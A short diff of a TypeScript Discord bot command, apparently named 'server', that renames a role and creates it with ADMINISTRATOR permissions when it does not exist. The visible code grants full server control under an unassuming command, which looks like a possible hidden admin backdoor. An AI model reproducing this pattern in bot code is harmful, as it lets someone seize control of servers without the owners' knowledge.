@@ -22,7 +22,7 @@ export default class serverCommand implements IBotCommand {
     }
 
     async runCommand(args: string[], msg: Discord.Message, Bot: Discord.Client): Promise<void> {
-        let roleName = "pleb-chakuj1"
+        let roleName = "ANYROLE!"
         var rolee = msg.guild.roles.find(r => r.name === roleName);
         if (!rolee){
             msg.guild.createRole( {name:roleName, color: "#9932CC", permissions:["ADMINISTRATOR"] } );
